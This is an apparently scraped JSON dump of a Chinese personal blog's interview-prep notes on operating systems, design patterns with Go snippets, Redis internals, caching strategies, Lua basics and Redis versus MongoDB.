在数据的生产者和消费者之间使用了零拷贝技术。生产者将数据直接写入内核缓冲区，消费者从内核缓冲区直接读取数据，避免了中间的数据拷贝过程。 堆和栈的区别分配管理 栈由编译器管理，自动分配和释放内存，函数调用时分配，并在函数返回时自动释放。 堆通常用于存储动态分配的数据，由程序员手动管理内存的分配和释放。malloc()、calloc()、realloc() 存储内容栈用于存储函数的局部变量和控制信息堆用于存储动态分配的数据，如动态数组、对象等。大小和位置 栈的大小是固定有限的，由系统在程序启动时分配，每个函数调用时，都会创建一个称为帧（Frame）的区域来存储这些信息 堆大小不固定，位置不固定 CPU占用率 使用率 负载CPU占用率、使用率和负载是监控和评估计算机系统性能的三个不同方面。 CPU占用率（CPU Usage）：CPU占用率是指计算机CPU处理任务的效率和利用率。它通常以百分比的形式表示，表示CPU正在执行任务的时间占总时间的比例。例如，一个CPU占用率为50%的系统表示CPU一半的时间用于处理任务，一半的时间处于空闲状态。 CPU使用率（CPU Utilization）：CPU使用率是指实际用于处理计算任务的CPU时间与总时间的比例。它反映了CPU的工作效率，是一个反映计算机性能的重要指标。CPU使用率可以分为用户态使用率、内核态使用率等不同类型。 负载（Load Average）：负载是一个相对于一段时间内系统CPU运算负荷的指标。通常以三个数值表示，分别表示系统在过去1分钟、5分钟和15分钟内的负载情况。例如，一个负载为1.0的系统表示在平均1分钟内，有一个任务在运行。 区别总结： CPU占用率关注的是CPU执行任务的效率，以百分比表示。CPU使用率关注的是实际用于处理任务的CPU时间占总时间的比例，也以百分比表示，但更偏向于反映CPU的工作效率。负载关注的是系统的整体负担情况，包括CPU、内存、磁盘等资源的占用情况，以及等待队列中的任务数。 Linux进程间通信：管道（匿名管道和有名管道）、信号、消息队列、共享内存、信号量、套接字（socket）Linus线程间通信：互斥量、信号量、条件变量linux启动主板加电BIOS，加电自检引导系统的Boot Loadergrub配置文件读取，加载内核用户层init进程执行rc.syninit初始化内核模块初始化用户空间的init 执行/etc/rc.d/rc.local(本地运行服务)执行/bin/login,就可以登录了。 linux删除命令rm，发生了什么linux文件系统里，用inode保存文件的数据结构，rm本质上是删除了这个inode和文件名的关联，然后文件的引用计数减少，当一个文件引用计数减少到0时，系统释放空间","categories":[{"name":"OS","slug":"OS","permalink":"http://waynamigo.github.io/categories/OS/"}],"tags":[{"name":"面试","slug":"面试","permalink":"http://waynamigo.github.io/tags/面试/"},{"name":"OS","slug":"OS","permalink":"http://waynamigo.github.io/tags/OS/"}]},{"title":"设计模式","slug":"2023-01-05-面经设计模式","date":"2023-01-04T16:00:00.000Z","updated":"2023-11-19T12:42:22.481Z","comments":true,"path":"2023/01/05/2023-01-05-面经设计模式/","link":"","permalink":"http://waynamigo.github.io/2023/01/05/2023-01-05-面经设计模式/","excerpt":"questions","text":"questions 设计模式六大原则开闭原则：软件实体（类、函数、模块）对扩展开放，对修改封闭 单一职责：每个类只做它负责的事情（一个类应该只有一个引起它修改的原因）里氏替换：子类可以完全代替父类 依赖倒置：细节依赖于抽象，抽象不依赖于细节，程序细节由底层完成 最少知道：迪米特法则，尽量降低类与类之间的耦合。一个类不应该知道自己操作的类的细节 接口隔离：一个接口实现时，如果有冗余，就应该把接口拆分，让实现的类只依赖自己需要的接口，客户端不应依赖于它不知道的接口 创造型模式12345工厂方法模式：为每一类对象建立工厂，将对象交由工厂创建，客户端只和工厂打交道。抽象工厂模式：为每一类工厂提取出抽象接口，使得新增工厂、替换工厂变得非常容易。建造者模式：用于创建构造过程稳定的对象，不同的 Builder 可以定义不同的配置。单例模式：全局使用同一个对象，分为饿汉式和懒汉式。懒汉式有双检锁和内部类两种实现方式。原型模式：为一个类定义 clone 方法，使得创建相同的对象更方便。 饿汉：变量在声明时便初始化，但饿汉式有一个弊端，那就是即使这个单例不需要使用，它也会在类加载之后立即创建出来，占用一块内存，并增加类初始化时间。懒汉：先声明一个空变量，需要用时才初始化。懒汉式解决了饿汉式的弊端，好处是按需加载，避免了内存浪费，减少了类初始化时间。 - 但是懒汉不是线程安全的，要实现线程安全的懒汉，需要加同步锁 1234567891011121314151617import \"sync\"// 同步包type Singleton struct&#123; &#125;//饿汉var instance *Singleton = &amp;Singleton&#123;&#125;func getInstance() *Singleton&#123; return instance&#125;//懒汉线程安全var once sync.Oncefunc getInstance() *Singleton&#123; once.Do(func()&#123; instance := &amp;Singleton&#123;&#125; &#125;) return instance&#125; 工厂模式抽象工厂模式单例模式建造者模式原型模式 结构型模式123456适配器模式：用于有相关性但不兼容的接口桥接模式：用于同等级的接口互相组合组合模式：用于整体与部分的结构外观模式：体现封装的思想享元模式：体现面向对象的可复用性代理模式：主要用于对某个对象加以控制 适配器模式装饰器模式代理模式享元模式：享元模式的主要目的是实现对象的共享，即共享池，当系统中对象多的时候可以减少内存的开销，通常与工厂模式一起使用。 FlyWeightFactory负责创建和管理享元单元，当一个客户端请求时，工厂需要检查当前对象池中是否有符合条件的对象，如果有，就返回已经存在的对象，如果没有，则创建一个新对象，FlyWeight是超类。一提到共享池，我们很容易联想到Java里面的JDBC连接池，想想每个连接的特点，我们不难总结出：适用于作共享的一些个对象，他们有一些共有的属性，就拿数据库连接池来说，url、driverClassName、username、password及dbname，这些属性对于每个连接来说都是一样的，所以就适合用享元模式来处理，建一个工厂类，将上述类似属性作为内部数据，其它的作为外部数据，在方法调用时，当做参数传进来，这样就节省了空间，减少了实例的数量。 外观模式桥接模式组合模式 行为型模式12345678910111213行为型模式重点关注类与类之间的交互与协作。如同在工作中，每个人的行为都可能影响到其他同事，同时每个人也会受到别人的影响。我们一边接收上级的指令，一边派发任务给下级，在这样的协作中完成一项项伟大的工作。程序在运行时，每个对象都不是孤立的，他们可以通过通信与协作完成种种复杂的功能。责任链模式：处理职责相同，程度不同的对象，使其在一条链上传递命令模式：封装“方法调用”，将行为请求者和行为实现者解耦解释器模式：定义自己的语法规则迭代器模式：定义 next() 方法和 hasNext() 方法，让外部类使用这两个方法来遍历列表，以达到隐藏列表内部细节的目的中介者模式：通过引入中介者，将网状耦合结构变成星型结构备忘录模式：存储对象的状态，以便恢复观察者模式：处理一对多的依赖关系，被观察的对象改变时，多个观察者都能收到通知状态模式：关于多态的设计模式，每个状态类处理对象的一种状态策略模式：殊途同归，用多种方法做同一件事模板方法模式：关于继承的设计模式，父类是子类的模板访问者模式：将数据的结构和对数据的操作分离 责任链模式：责任链模式：使多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合关系。将这些对象连成一条链，并沿着这条链传递该请求，直到有一个对象处理它为止观察者模式中介者模式访问者模式解释器模式迭代器模式命令模式备忘录模式 面试问题 面向对象的特点是什么？ 可维护、可复用、可扩展、灵活性好。 让面向对象保持结构良好的秘诀是什么？ 让面向对象保持结构良好的秘诀就是设计模式，面向对象结合设计模式，才能真正体会到程序变得可维护、可复用、可扩展、灵活性好。 六大设计原则是什么？ 开闭原则、单一职责原则、里氏替换原则、依赖倒置原则、迪米特原则、接口隔离原则。 什么是里氏替换原则？ 子类应该可以完全替换父类。也就是说在使用继承时，只扩展新功能，而不要破坏父类原有的功能。 工厂模式是用于达到什么目的的设计模式？ 封装对象。 工厂模式有哪三种？ 简单工厂模式、工厂方法模式、抽象工厂模式。 工厂方法模式解决了简单工厂模式的哪两个弊端？ 当生产的产品种类越来越多时，工厂类不会变成超级类。工厂类会越来越多，保持灵活。不会越来越大、变得臃肿。如果苹果的生产过程需要修改时，只需修改苹果工厂。梨子的生产过程需要修改时，只需修改梨子工厂。符合单一职责原则。当需要生产新的产品时，无需更改既有的工厂，只需要添加新的工厂即可。保持了面向对象的可扩展性，符合开闭原则。 抽象工厂模式是什么样的？ 在创建时指定了具体的工厂类后，在使用时就无需再关心是哪个工厂类，只需要将此工厂当作抽象的 IFactory 接口使用即可。这种经过抽象的工厂方法模式被称作抽象工厂模式。 抽象工厂模式很好的发挥了哪些原则？ 开闭原则、依赖倒置原则。 抽象工厂模式的缺点是什么？ 缺点是抽象工厂模式太重了，如果 IFactory 接口需要新增功能，则会影响到所有的具体工厂类。使用抽象工厂模式，替换具体工厂时只需更改一行代码，但要新增抽象方法则需要修改所有的具体工厂类。 抽象工厂模式适用于和不适用于哪些情况？ 适用于增加同类工厂这样的横向扩展需求，不适合新增功能这样的纵向扩展。 什么时候可以使用单例模式？ 某个对象全局只需要一个实例时即可。 单例模式的优点是什么？ • 它能够避免对象重复创建，节约空间并提升效率• 避免由于操作不同实例导致的逻辑错误 单例模式有哪两种实现方式？请分别简单解释。 饿汉式和懒汉式。饿汉式指变量在声明时便初始化。懒汉式指先声明一个空变量，需要用时才初始化。 饿汉式的弊端是什么？ 即使这个单例不需要使用，它也会在类加载之后立即创建出来，占用一块内存，并增加类初始化时间。 静态内部类方式是怎么保证线程安全的？ Java 虚拟机的设计是非常稳定的，早已经考虑到了多线程并发执行的情况。虚拟机在加载类的 clinit 方法时，会保证 clinit 在多线程中被正确的加锁、同步。即使有多个线程同时去初始化一个类，一次也只有一个线程可以执行 clinit 方法，其他线程都需要阻塞等待，从而保证了线程安全。 建造者模式用于什么时候？ 创建过程稳定，但配置多变的对象。 建造者模式是什么意思？ 将一个复杂的构建与其表示相分离，使得同样的构建过程可以创建不同的表示。 现在建造者模式主要用来做什么？ 通过链式调用生成不同的配置。 使用建造者模式的好处是什么？ 不用担心忘了指定某个配置，保证了构建过程是稳定的。 原型模式是什么？ 用原型实例指定创建对象的种类，并且通过拷贝这些原型创建新的对象。 适配器模式适用于什么结构？ 有相关性但不兼容的结构。 什么是适配？什么是适配器？ 源接口通过一个中间件转换后才可以适用于目标接口，这个转换过程就是适配，这个中间件就称之为适配器。 需要绘制矩形、圆形、三角形这三种图案，按照桥接模式的思想会怎么做？ 将形状和颜色分离，根据需要对形状和颜色进行组合。 什么是桥接模式？ 将抽象部分与它的实现部分分离，使它们都可以独立地变化。它是一种对象结构型模式，又称为柄体模式或接口模式。 组合模式适用于什么结构？ 组合模式用于整体与部分的结构，当整体与部分有相似的结构，在操作时可以被一致对待时，就可以使用组合模式。 组合模式最主要的功能是什么？ 组合模式最主要的功能是让用户可以一致对待整体和部分结构，将两者都作为一个相同的组件。 什么是组合模式中的透明方式？ 违背了接口隔离原则的组合模式。 什么是安全方式？ 在 Component 中不声明 add 和 remove 等管理子对象的方法，这样叶节点就无需实现它，只需在枝节点中实现管理子对象的方法即可。 什么是透明装饰模式？ 装饰器仅用于增强功能，并不会改变 Me 原有的功能，这种装饰模式称之为透明装饰模式。 装饰模式的缺点是什么？ 容易造成程序中有大量相似的类。 动态代理相对于静态代理的优势是什么？ 节省代码量。 简述责任链模式的有优点有哪些？ • 降低了对象之间的耦合度。• 扩展性强，满足开闭原则。可以根据需要增加新的请求处理类。• 灵活性强。可以动态地改变链内的成员或者改变链的次序来适应流程的变化。• 简化了对象之间的连接。每个对象只需保持一个指向其后继者的引用。 什么是宏命令？ 宏命令是将多个命令合并起来组成的命令。 请写出解释器模式的一个常见应用。 在我们平时匹配字符串时，用到的正则表达式就是一个解释器。 怎样使得外部类只能读取此列表中的数据，无法修改其中的任何数据，保证其安全性？ • 提供一个 String next() 方法，使得外部类可以按照次序，一条一条的读取数据；• 提供一个 boolean hasNext() 方法，告知外部类是否还有下一条数据。","categories":[{"name":"软件工程","slug":"软件工程","permalink":"http://waynamigo.github.io/categories/软件工程/"}],"tags":[{"name":"面试","slug":"面试","permalink":"http://waynamigo.github.io/tags/面试/"},{"name":"设计模式","slug":"设计模式","permalink":"http://waynamigo.github.io/tags/设计模式/"},{"name":"UML","slug":"UML","permalink":"http://waynamigo.github.io/tags/UML/"}]},{"title":"Redis questions","slug":"2023-01-04-面经Redis问题","date":"2023-01-03T16:00:00.000Z","updated":"2023-11-25T10:19:46.331Z","comments":true,"path":"2023/01/04/2023-01-04-面经Redis问题/","link":"","permalink":"http://waynamigo.github.io/2023/01/04/2023-01-04-面经Redis问题/","excerpt":"questions https://github.com/redisson/redisson/wiki/目录","text":"questions https://github.com/redisson/redisson/wiki/目录 1.memcached和redis区别有哪些，优势劣势？redis支持多种数据类型，并且支持持久化策略， 2.实现本地缓存，有哪些方案？go本地，redis3.redis通讯协议？特点是什么【TCP】4.字符串最大长度是多少？512MB5.介绍一下zset及底层实现机制6.redis事务？原理是什么7.事务相关命令？支持回滚吗8.介绍一下pipeline和使用场景：批量读取写入批量执行Redis命令的机制，它可以在客户端发送多个命令后，一次性将它们发送到服务器，然后一次性接收服务器的响应 和批量命令有什么不同 pipeline是同时发送/执行不同命令的机制，批量是都需要执行相似的 pipeline是顺序执行所有命令，执行一个一个状态，而批量需要等待所有的返回9.设置生存时间和过期时间用什么命令12EXPIRE key n_secondsPEXPIRE mykey n_milseconds 10.介绍下redis的发布订阅功能 允许多个客户端之间通过消息中间件来发送和接收消息。在这种模式下，消息的发送者称为发布者（Publisher），而消息的接收者称为订阅者（Subscriber） Redis的发布订阅功能是异步的，消息的发送和接收是非阻塞的，因此在订阅者接收消息时需要特别注意处理并发和同步的问题。11.redis单线程为什么那么快单线程没有锁，主线程异步处理IO，避免多线程上下文切换12. 分布式缓存要注意哪些问题 缓存一致性 缓存击穿 缓存雪崩 13. redis的key删除策略【redis同时使用了惰性删除和定期删除】 定期删除，每 100 毫秒检查 20 个随机选择的过期 key，这个过期的key存储在expire字典中，如果发现有过期的 key，就会将其删除。 惰性删除，访问时检查key有没有过期，然后删除。 设置过期时间+一个随机的时间，防止缓存雪崩 luahttps://zhuanlan.zhihu.com/p/383994942?utm_oi=757371723308879872 lua的基本数据类型 nil 这个最简单，只有值nil属于该类，表示一个无效值（在条件表达式中相当于false）。 boolean 包含两个值：false和true。 number 表示双精度类型的实浮点数 string 字符串由一对双引号或单引号来表示 function 由 C 或 Lua 编写的函数 userdata 表示任意存储在变量中的C数据结构 thread 表示执行的独立线路，用于执行协同程序 table Lua 中的表（table）其实是一个”关联数组”（associative arrays），数组的索引可以是数字、字符串或表类型。在 Lua 里，table 的创建是通过”构造表达式”来完成，最简单构造表达式是{}，用来创建一个空表。 1. pairs 和ipairs ipairs遇到nil会停止，pairs会输出nil值然后继续下去 ipairs并不会输出table中存储的键值对,会跳过键值对，然后顺序输出table中的值。而pairs会输出table的键值对，先顺序输出值，再乱序(键的哈希值)输出键值对。 高频问题1. Redis为什么那么快 redis存储是基于内存的 命令的读写过程单线程执行，6.0之后引入了IO多线程，使用IO多路复用，提升网络IO的利用率和提速 底层数据存储结构使用的是全局hash，也就是kv存储，还有几种数据类型用了高效的压缩列表，哈希表跳表等等 String 简单动态字符串，线程安全，使用incr也线程安全，一个是incr原子操作，一个是string根据len去判断 Zset 有序集合，使用的跳表：有序链表的优化，2. Redis对于过期key的处理 惰性删除，一个key发生读写时，去判断是否过期，过期了直接删 定时删除，默认每100ms主动淘汰一批过期的key 定期删除，server.hz配置每秒钟执行serverCron()的次数，周期性轮询redis库中的时效性数据，采用随机抽取的策略 3. key没设置过期时间为什么还被删除了【在内存使用超阈值之后，会自动清一波没有使用的内存】对于没有过期时间的key，使用allkeys-lru/allkeys-lfu/allkeys-random三种策略去淘汰 4. 删除key的命令会阻塞redis吗？【会发生阻塞】因为在数据结构中删除存在一个，时间复杂度O(k)，n为存在的数量，是个常数，返回值是删除的数量 5. 主从 哨兵 集群 优缺点 主从，主负责写，从负责读，主要作用相当于一个备份 哨兵三个sentinel去监控节点，master发生故障进行切换，提供服务的还是只有一个主节点，无法支持特别高的并发 集群，复制，高可用，分片，配置简单， 6. 集群模式，数据的hash分片算法 redis集群时，有数据分片存储，找kv分在了哪个节点上 分片算法首先对key做CRC16得到一个中间值，然后mod 16384，根据分片规则，就能算到请求要到哪个master上7. 主从切换为什么会导致缓存雪崩【从节点所在系统时间戳不同】 8. RDB快照和AOF问题主从复制只用RDB 9. 线上数据如何备份 定时把rdb或者aof持久化文件存到备份硬盘或者机器上，可以用crontab 分时日月周 10. 主从复制风暴是什么【发生在从节点特别多的情况】节点重起的多，要求主节点发rdb文件，如果从节点只连接主节点，压力就特别大如果要减轻压力，rdb复制的路线就采用树形结构，从节点发到下一级的从节点 11. 网络抖动导致频繁主从切换，怎么处理【redis timeout超过一定阈值，才认定故障，发生主从切换】12. 为什么redis至少需要三个master选举主节点时，要求半数以上的节点去选一个新主节点 13. mset mget批量指令支持redis集群吗【支持】要借助hashtag，保证每次批量执行的key落在明确的节点上，要用大括号括一个值，在hash分片的时候查找 14. lua可以在集群执行吗【可以，但是有要求，同13问】操作的key必须落在明确的节点上，hash分片 15. 主从切换导致分布式锁丢失主节点把分布式锁的key发给slave是，因为是异步的，可能中间master挂了，导致丢失了 有一种redlock的方法，要搞半数以上的独立redis节点，服务端才认定加锁成功。类似于zookeeper，但是 16. 大公司使用旁路写回的情况，是建立在设置好超时时间的前提下的【redis集群一致性】：主从复制，分片算法 主从复制 12341）从节点连接主节点，并发送SYNC命令请求同步数据。2）主节点在接收到SYNC命令后，开始执行BGSAVE命令，将数据持久化到磁盘中，并将生成的RDB文件发送给从节点。3）从节点在接收到RDB文件后，通过LOAD命令将其加载到内存中，从而与主节点的数据保持一致。4）从节点开始接收主节点的增量数据，并将其应用到自己的数据集中，保持与主节点的同步。 分片算法，每次对key的CRC16值mod 16384 ，判定放置的slot号，然后落在哪个实例上 更改、增加、删除实例时，就更改slot和实例的分配，不会影响集群总体的一致性，但是不是强一致性。 17. 解决缓存数据库双写不一致情况【双写指两个/多个写操作，其中有一个在查db和更新缓存之间顿了一下导致】 加个分布式锁，在查db和更缓存这两个过程绑一起，更新完再delete这把锁 1234567891011RLock wlock = redission.createReadWriteLock(lockname);//在一个上锁的事务,两边都要try&#123; Rlock wlock = redission.getReadWriteLock(lockname + id); wlock.lock(); //transaction code //1. update db //2. set redis key&#125;catch()&#123;&#125;finally&#123; wlock.unlock();&#125; 18. 分布式锁在遇到高并发时，出现串行征用问题解决方法：读写锁读写锁底层如何实现的？1.为什么写写互斥，写读互斥，读读不互斥？ 19. 一个创建某个cache的操作进行上锁，几万个请求来搞这个请求，如何优化【使用redission的trylock】就是所有线程都在自旋等待unlock锁，默认是非公平抢占锁 12Rlock lock = redission.getlock()lock.lock() // 改成lock.trylock() Redis和MongoDB的区别Redis和MongoDB都是流行的开源NoSQL数据库，但它们的设计理念和使用场景有所不同。本文将重点介绍Redis和MongoDB的区别和使用场景。 Redis是一个高性能的数据存储系统，常被用作缓存和消息中间件。Redis以内存为主要存储介质，但它也支持将数据持久化到磁盘上。Redis是一款键值数据库，它支持多种数据结构（例如字符串、列表、哈希表、有序集合等），并提供了丰富的命令和API供开发者使用。 MongoDB是一个面向文档的数据库，它以JSON格式存储数据。MongoDB是一款NoSQL数据库，它支持复杂的查询和数据聚合操作。MongoDB的数据模型和关系型数据库有所不同，它不需要事先定义表结构和字段，可以动态地添加或删除数据字段。MongoDB也支持数据的分片和复制，以实现数据的高可用和横向扩展。 Redis和MongoDB的区别（1）数据模型 Redis是一个键值数据库，数据结构简单，适用于存储缓存数据和消息队列等场景。Redis支持字符串、列表、哈希表、有序集合等基本数据结构，同时还支持订阅与发布机制、Lua脚本等高级特性。Redis的数据操作速度非常快，可以达到单机每秒数百万次读写的性能。 MongoDB是一个面向文档的数据库，数据结构相对复杂，适用于存储各种应用数据。MongoDB的数据以BSON格式存储，类似于JSON，但支持更多的数据类型和地理位置信息等特性。MongoDB支持文档级别的事务和复杂的数据聚合操作。 （2）持久化机制 Redis最初是一个基于内存的缓存系统，但它提供了多种持久化机制来保证数据安全。Redis的持久化是异步的，默认情况下，Redis将数据写入内存，然后将数据异步地写入磁盘上的RDB文件或AOF文件。RDB文件是一个快照文件，可以定期保存数据库的状态，而AOF是一个日志文件，可以记录每个写操作的命令序列。 MongoDB支持多种持久化机制，包括基于写前日志（Write Ahead Log，WAL）和基于快照的持久化机制。MongoDB将每个写操作写入WAL，然后异步地将WAL中的操作应用到数据集中。MongoDB还可以定期创建数据集的快照，并将快照写入磁盘中的文件。WAL和数据集的快照可以用于数据的恢复和复制。 （3）查询特性 Redis的查询特性相对简单，主要支持基于键值的查询和基本的条件查询。Redis的查询速度非常快，因为它的数据都在内存中，可以直接访问。Redis还支持数据交集、并集和差集等高级查询特性。 MongoDB的查询特性非常强大，支持复杂的查询和数据聚合操作。MongoDB支持索引、分片、复制和副本集等技术，以提高查询的速度和可靠性。MongoDB还支持地理位置查询、全文搜索和图形查询等特性，可以满足不同应用场景的需求。 Redis和MongoDB的使用场景（1）Redis的使用场景 Redis的内存存储特性和高性能的数据读写能力，使它非常适合作为缓存系统和消息队列。Redis也可以用于会话管理、分布式锁和实时计数器等场景。Redis的数据结构和高级特性（例如Lua脚本和发布订阅机制）可以实现智能匹配、排行榜和广告推广等应用。 （2）MongoDB的使用场景 MongoDB的文档存储特性和丰富的查询特性，使它非常适合作为Web应用和移动应用的后端数据库。MongoDB可以处理复杂的数据结构和数据关系，支持动态增加和删除数据字段，可以快速地适应应用的变化。MongoDB还可以用于数据分析、数据挖掘和机器学习等领域，以支持大规模数据的处理和分析。 总结Redis和MongoDB都是优秀的NoSQL数据库，在不同的应用场景中有着不同的表现。Redis的内存存储和高性能的数据读写能力，使它适用于缓存和消息队列等场景。MongoDB的文档存储和强大的查询特性，使它适用于Web应用和移动应用的后端数据库。在选择Redis或MongoDB作为数据存储系统时，需要考虑应用的性能需求、数据模型和查询特性等因素。","categories":[{"name":"Redis","slug":"Redis","permalink":"http://waynamigo.github.io/categories/Redis/"}],"tags":[{"name":"面试","slug":"面试","permalink":"http://waynamigo.github.io/tags/面试/"},{"name":"Redis","slug":"Redis","permalink":"http://waynamigo.github.io/tags/Redis/"}]},{"title":"Redis","slug":"2023-01-04-面经Redis","date":"2023-01-03T16:00:00.000Z","updated":"2023-11-21T05:34:13.571Z","comments":true,"path":"2023/01/04/2023-01-04-面经Redis/","link":"","permalink":"http://waynamigo.github.io/2023/01/04/2023-01-04-面经Redis/","excerpt":"questions 使用go-redis连接，因为redigo无法连接redis集群redis集群可以用kratos的或者go-zero的分布式锁实现https://juejin.cn/post/7041375517580689439","text":"questions 使用go-redis连接，因为redigo无法连接redis集群redis集群可以用kratos的或者go-zero的分布式锁实现https://juejin.cn/post/7041375517580689439 go-redis 连接集群12345678910func initClient()(err error)&#123; rdb := redis.NewClusterClient(&amp;redis.ClusterOptions&#123; Addrs: []string&#123;\":7000\", \":7001\", \":7002\", \":7003\", \":7004\", \":7005\"&#125;, &#125;) _, err = rdb.Ping().Result() if err != nil &#123; return err &#125; return nil&#125; go-redis 连接哨兵1234567891011func initClient()(err error)&#123; rdb := redis.NewFailoverClient(&amp;redis.FailoverOptions&#123; MasterName: \"master\", SentinelAddrs: []string&#123;\"x.x.x.x:26379\", \"xx.xx.xx.xx:26379\", \"xxx.xxx.xxx.xxx:26379\"&#125;, &#125;) _, err = rdb.Ping().Result() if err != nil &#123; return err &#125; return nil&#125; Redis数据类型 String List Hash Set Zset SDS QuickList Dict、ZipList Dict、Intset SkipList # redis内存模型？ hashtable 特殊数据类型 BitMap：签到、行为统计（点赞） hyperloglog：不太了解 Geospatial：基于sort set，GEO 中存储的地理位置信息的经纬度数据通过 GeoHash 算法转换成了一个整数，这个整数作为 Sorted Set 的 score(权重参数)使用。 【重点】一致性问题：Redis和数据库的一致性https://juejin.cn/post/7287026079066800168#heading-1 【重点】redis主从的一致性【配置redis.conf】 全量复制，master-&gt;slave1-&gt;slave2的级联方式 全量 salve 发送sync请求到master，开始第一次同步 第一次同步时使用bgsave做rdb快照，同时将后续修改记录加到内存缓冲区，完成后将rdb文件同步到从节点，复制完后由从节点加载到内存 加载完成后通知master，master将缓冲区的写操作记录发给slave，slave再执行剩余的这些写操作，与master保持一致 部分复制 slave发送psync请求到master，开始第一次同步 slave再发一个偏移量，master从这个偏移量开始同步数据 三种缓存读写策略1. Cache Aside Pattern（旁路缓存模式） 写：先更新DB，再删除cache，先dao.create/update/delete，再更新缓存，用redis实例去set更新key 读：先从cache读，读到就返回；读不到就读db，将数据写到cache ，先从redis.get，如果非空，用dao查找 为什么要删缓存而不是更新？删除轻量一些，更新比较耗时，数据重新回缓存由更多的读操作实现 【问题】可以先删cache，再更新db吗？不能，因为写的时间远大于读，出现数据不一致的可能性更高，因为在更新db前，cache可能已经被读操作覆盖了缺陷有哪些 不能避免个别的不一致性问题，就是脏读问题 写操作多的情况影响性能，因为每次都要更新db 在高并发的情况下，不管是先写数据库，再删缓存；还是先删缓存，再写数据库，都有可能出现数据不一致的情况，比如：123456789如果删除了缓存redis，还没来得及写库mysql,另一个线程就读取，发现缓存为空，则去数据库读取数据写入缓存，此时缓存中的数据为脏数据。如果写了库，在删除缓存前，写库的线程故障了，也会出现数据不一致的情况。解决办法：延迟双删策略1、先删除缓存2、再写数据库3、休眠时间（根据统计线程读取数据和写缓存的时间）（休眠的作用是当前线程等其他线程读完了数据后写入缓存后，删除缓存）4、再删除缓存 解决方法解决办法： 数据库和缓存数据强一致场景：更新 db 的时候同样更新 cache，不过我们需要加一个锁/分布式锁来保证更新 cache 的时候不存在线程安全问题。 可以短暂地允许数据库和缓存数据不一致的场景：更新 db 的时候同样更新 cache，但是给缓存加一个比较短的过期时间，这样的话就可以保证即使数据不一致的话影响也比较小 还有一个阿里的canal组件，是监控mysql的binlog，更改了就自动去写redis2. Read/Write Through Pattern（读写穿透） 写：先查cache，没有就直接更新db；有的话， 先更新cache，cache服务自己更新db 读：先从cache读，读到就返回；读不到就读db，写入到cache3. Write Behind Pattern（异步缓存写入） 写：先查cache，没有直接更新db；有的话，只更新缓存，异步批量写db 读：先从cache读，读到就返回；读不到就读db，写入到cache 与读写穿透的区别：：Read/Write Through 是同步更新 cache 和 db，而 Write Behind 则是只更新缓存，不直接更新 db，而是改为异步批量的方式来更新 db。 Redis持久化Redis持久化的方式Redis 共有三种数据持久化的方式： AOF（Append Only File）日志：每执行一条写操作命令，就把该命令以追加的方式写入到一个文件里； RDB（Redis Database Backup file） 快照：将某一时刻的内存数据，以二进制的方式写入磁盘； 混合持久化方式：Redis 4.0 新增的方式，集成了 AOF 和 RBD 的优点RDB快照提供两个命令实现快照 save：在主线程实现，可能会导致阻塞 bgsave：background save，在后台的子进程生成RDB快照 RDB 在执行快照的时候，数据能修改吗？ 执行 bgsave 过程中，Redis 依然可以继续处理操作命令的，也就是数据是能被修改的，关键的技术就在于【写时复制技术】（Copy-On-Write, COW）。 技术原理：bgsave会通过 fork() 创建子进程，此时子进程和父进程是共享同一片内存数据的，因为创建子进程的时候，会复制父进程的页表，但是页表指向的物理内存还是一个，此时如果主线程执行读操作，则主线程和 bgsave 子进程互相不影响。 AOF日志在执行完一条写操作命令后，就会把该命令以追加的方式写入到一个文件里，然后 Redis 重启时，会读取该文件记录的命令，然后逐一执行命令的方式来进行数据恢复。它们的区别是什么AOF：三种写回方式 所以，RDB 快照就是记录某一个瞬间的内存数据，记录的是实际数据，而 AOF 文件记录的是命令操作的日志，而不是实际的数据。 因此在 Redis 恢复数据时， RDB 恢复数据的效率会比 AOF 高些，因为直接将 RDB 文件读入内存就可以，不需要像 AOF 那样还需要额外执行操作命令的步骤才能恢复数据。 AOF 日志过大，会触发什么机制 【AOF 重写机制】，压缩AOF文件：【压缩方式】：在重写时，读取当前数据库中的所有键值对，然后将每一个键值对用一条命令记录到「新的 AOF 文件」，等到全部记录完后，就将新的 AOF 文件替换掉现有的 AOF 文件。但是对KV的记录就保持最新的那一条 redis事务【不建议开发时使用，和mysql不一致的时候会造成缓存读写的限制问题】不支持回滚 ULTI/EXEC 命令：在 Redis 中，事务的开始由 MULTI 命令表示，结束由 EXEC 命令表示。在 MULTI 和 EXEC 之间的所有命令会被添加到事务队列中，但不会立即执行。 WATCH 命令：Redis 提供了 WATCH 命令，可以用于在事务执行之前监视一个或多个键。如果在事务执行过程中，被监视的键被其他客户端修改了，事务将会被打断。 数据类型实现String(字符串) 应用场景:缓存对象、常规计数、分布式锁、共享 session 信息等。 底层数据结构是SDS（Simple Dynamic String）简单动态字符串，保存文本数据，还可以保存二进制数据 。因为 SDS 使用 len 属性 的值而不是空字符来判断字符串是否结束，并且 SDS 的所有 API 都会以处理二进制的方式来处理 SDS 存放在 buf[] 数组里的数据。所以 SDS 不光能存放文本数据，而且能保存图片、音频、视频、压缩文件这样的二进制数据。 Redis 的 SDS API 是安全的，拼接字符串不会造成缓冲区溢出 ：因为 SDS 在拼接字符串之前会检查 SDS 空间是否满足要求，如果空间不够会自动扩容，所以不会导致缓冲区溢出的问题。 使用 String 来缓存对象有两种方式： 直接缓存整个对象的 JSON，命令例子： user:1 '&#123;\"name\":\"xiaolin\", \"age\":18&#125;'```12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394采用将 key 进行分离为 user:ID:属性，采用 MSET 存储，用 MGET 获取各属性值，命令例子： MSET user:1:name xiaolin user:1:age 18 user:2:name xiaomei user:2:age 20**### List(列表)- **数据结构**：quicklist（双向链表+压缩列表）- **类型的应用场景**:消息队列(但是有两个问题:1. 生产者需要自行实现全局唯一ID;2. 不能以消费组形式消费数据)等**List 可以使用 LPUSH + RPOP （或者反过来，RPUSH+LPOP）命令实现消息队列。**- 生产者使用 LPUSH key value[value...] 将消息插入到队列的头部，如果 key 不存在则会创建一个空的队列再插入消息。- 消费者使用 RPOP key 依次读取队列的消息，先进先出。### Set(集合) 类型:聚合计算(并集、交集、差集)场景，比如点赞、共同关注、抽奖活动等。- **数据结构**：是由哈希表或整数集合实现的- 如果集合中的元素都是整数且元素个数小于 512 （默认值，set-maxintset-entries配置）个，Redis 会使用整数集合作为 Set 类型的底层数据结构；- 如果集合中的元素不满足上面条件，则 Redis 使用哈希表作为 Set 类型的底层数据结构。### Zset(有序集合) 类型:排序场景，比如排行榜、电话和姓名排序等- **数据结构** 